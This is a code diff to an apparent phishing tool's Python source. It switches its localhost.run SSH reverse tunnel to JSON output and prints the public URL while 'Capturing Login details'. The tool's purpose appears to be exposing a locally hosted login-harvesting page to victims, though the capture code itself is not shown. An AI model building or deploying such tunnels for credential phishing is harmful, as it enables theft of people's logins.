@@ -272,35 +272,33 @@ class Sources:
                 print(f"An error occurred: {e}")
                 port = input("Typing port that apache2 is using like 80 or 8080 --> ")
 
-            cmd = ['ssh','-i', key_name,'-R', f'{port}:localhost:{port}','localhost.run']
+            cmd = ['ssh','-i', key_name,'-R', f'{port}:localhost:{port}','localhost.run',"--","--output","json"]
             process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             while True:
                 output = process.stdout.readline()
-                if process.poll() is not None:
-                    break
-                if "tunneled with tls termination, https://" in output and ".lhr.life" in output:
-                    url_check = output.split(" ")
-                    for url in url_check:
-                        if ("https://" in url or "http://" in url) and ".lhr.life" in url:
-                            url = url.replace(" ","").replace("\n","").replace("\t","")
-                            if url_no == 0:
-                                os.system("clear")
-                                print(f"{BLUE}\rURL -->{RESET}{GREEN} {url}{RESET}")
-                                print(f"{RED}\r[-] Sometimes localhost.run change url. New url will be provided when it is changed..")
-                                print(f"{BLUE}\rCapturing Login details..... Press CTRL+C to close SSH tunneling and Press CTRL+C twice to close both SSH tunneling and Capturng.... {RESET}")
-                                print("\r")
-                                url_no += 1
-                            elif url_no > 0:
-                                print("\n\n\r-----------------------------------------------------------------------------------")
-                                print(f"{BLUE}\r[--] Localhost.run have changed the url.... {RESET}")
-                                print(f"{BLUE}\rURL -->{RESET}{GREEN} {url}{RESET}")
-                                print(f"{BLUE}\rCapturing Login details..... Press CTRL+C to close SSH tunneling and Press CTRL+C twice to close both SSH tunneling and Capturng.... {RESET}")
-                                print("\r")
-                                url_no += 1
-
-
-            rc = process.poll()
-            return rc
+                try:
+                    json_output = json.loads(output)
+                except json.JSONDecodeError as e:
+                    pass
+                if isinstance(json_output, dict):
+                    if "address" in json_output:
+                        url = json_output["address"]
+                        if url_no == 0:
+                            os.system("clear")
+                            print(f"{BLUE}\rURL -->{RESET}{GREEN} https://{url}{RESET}")
+                            print(f"{RED}\r[-] Sometimes localhost.run change url. New url will be provided when it is changed..")
+                            print(f"{BLUE}\rCapturing Login details..... Press CTRL+C to close SSH tunneling and Press CTRL+C twice to close both SSH tunneling and Capturng.... {RESET}")
+                            print("\r")
+                            url_no += 1
+                        elif url_no > 0:
+                            print("\n\n\r-----------------------------------------------------------------------------------")
+                            print(f"{BLUE}\r[--] Localhost.run have changed the url.... {RESET}")
+                            print(f"{BLUE}\rURL -->{RESET}{GREEN} https://{url}{RESET}")
+                            print(f"{BLUE}\rCapturing Login details..... Press CTRL+C to close SSH tunneling and Press CTRL+C twice to close both SSH tunneling and Capturng.... {RESET}")
+                            print("\r")
+                            url_no += 1
+        except KeyboardInterrupt:
+            pass
         except Exception as e:
             print(f"Error in port forwarding: {e}")
             return None
